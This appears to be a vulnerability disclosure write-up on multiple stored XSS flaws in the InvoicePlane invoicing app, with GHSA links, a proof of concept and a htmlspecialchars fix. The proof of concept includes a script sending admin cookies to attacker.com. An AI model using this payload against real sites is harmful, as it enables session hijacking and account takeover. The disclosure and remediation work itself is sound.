# Multiple Stored XSS Vulnerabilities in InvoicePlane

**Severity:** Moderate 🟡
**Associated GHSAs:** 
- [GHSA-346c-gqqq-mrm2](https://github.com/InvoicePlane/InvoicePlane/security/advisories/GHSA-346c-gqqq-mrm2)
- [GHSA-g53q-v2pv-xr83](https://github.com/InvoicePlane/InvoicePlane/security/advisories/GHSA-g53q-v2pv-xr83)
- [GHSA-x38q-xhjj-jr8w](https://github.com/InvoicePlane/InvoicePlane/security/advisories/GHSA-x38q-xhjj-jr8w)
- [GHSA-9372-vj68-hmc3](https://github.com/InvoicePlane/InvoicePlane/security/advisories/GHSA-9372-vj68-hmc3)
- [GHSA-qf9q-2hxm-4wh9](https://github.com/InvoicePlane/InvoicePlane/security/advisories/GHSA-qf9q-2hxm-4wh9)

**Target:** InvoicePlane
**Vulnerability Type:** Stored Cross-Site Scripting (XSS)

---

## 1. Executive Summary

During a comprehensive security audit of **InvoicePlane**, a popular open-source invoicing and billing application, I discovered a systemic failure to sanitize user input across multiple core modules. This resulted in several **Stored Cross-Site Scripting (XSS)** vulnerabilities within the Admin Panel, Invoice Views, Product Forms, and Client Profiles.

An attacker (such as a malicious client or an internal user with low privileges) could inject malicious JavaScript payloads into these fields. When an Administrator views the compromised invoices or dashboards, the payloads execute within their browser, leading to session hijacking and complete administrative account takeover.

## 2. The Vulnerability (The "Hunt")

Stored XSS occurs when an application accepts untrusted data and stores it on the server (usually in a database) without proper validation or escaping. When this data is later retrieved and rendered in an HTML page, the browser interprets the malicious data as executable code.

My testing methodology involved systematically mapping every input field in the application that eventually gets reflected on a dashboard or view page. 

I identified that while some fields were protected, several critical data points were rendered directly to the DOM without HTML entity encoding:
1.  **Client Names / Details:** Fields associated with client profiles.
2.  **Invoice Terms and Conditions:** Text areas attached to generated invoices.
3.  **Product Unit Names:** Custom product descriptions in the inventory module.
4.  **Identifier Formatting:** Custom ID generation rules.

Because the backend framework (CodeIgniter/PHP) was not configured to automatically escape output in these specific view templates, the application was highly vulnerable.

## 3. The Exploitation (Proof of Concept)

Let's look at one of the specific vectors: **The Invoice Terms & Conditions field**.

### Step 1: Injecting the Payload
An attacker with access to create or modify an invoice (e.g., a low-privileged employee) navigates to the invoice creation form. In the "Terms and Conditions" text area, they insert a standard XSS payload designed to steal session cookies:

```html
Standard invoice terms apply. 
<script>
  var i = new Image();
  i.src = "http://attacker.com/steal?cookie=" + btoa(document.cookie);
</script>
```

They save the invoice. The backend stores this exact string in the MySQL database.

### Step 2: Triggering the Execution
Later, a high-privileged Administrator logs into the InvoicePlane dashboard and clicks on the compromised invoice to review it. 

When the page loads, the browser parses the HTML. Upon hitting the `<script>` tag injected by the attacker, the browser executes the JavaScript. The script silently reads the Administrator's `document.cookie` (which contains their active session token), Base64 encodes it, and sends it to the attacker's server via an invisible image request.

### Step 3: Account Takeover
The attacker monitors their server logs:
`GET /steal?cookie=aXBfc2Vzc2lvbl9pZD1hYmMxMjM...`

The attacker decodes the cookie, injects it into their own browser, and successfully hijacks the Administrator's active session, gaining full control over the InvoicePlane instance.

## 4. Impact

Stored XSS in administrative panels is incredibly dangerous. The impact includes:
*   **Session Hijacking:** Stealing active authentication cookies to impersonate admins.
*   **Action Forgery:** Forcing the administrator's browser to perform actions on their behalf (e.g., deleting clients, modifying billing information, or creating new admin accounts).
*   **Data Exfiltration:** Silently reading and exfiltrating sensitive client and financial data displayed on the screen.

## 5. Remediation

I submitted a comprehensive report detailing all 5 injection vectors. The InvoicePlane development team addressed these systemically.

### The Fix:
To permanently resolve Stored XSS, applications must adhere to the principle of **Context-Aware Output Encoding**. 

The fix involved updating the view templates to ensure all user-controlled data is passed through an HTML escaping function (like PHP's `htmlspecialchars()`) before being rendered in the browser. 

**Vulnerable Code:**
```php
<div class="terms">
    <?php echo $invoice->terms; ?>
</div>
```

**Patched Code:**
```php
<div class="terms">
    <?php echo htmlspecialchars($invoice->terms, ENT_QUOTES, 'UTF-8'); ?>
</div>
```

This ensures that characters like `<` and `>` are converted to safe HTML entities (`&lt;` and `&gt;`), rendering the malicious script as harmless text rather than executable code.
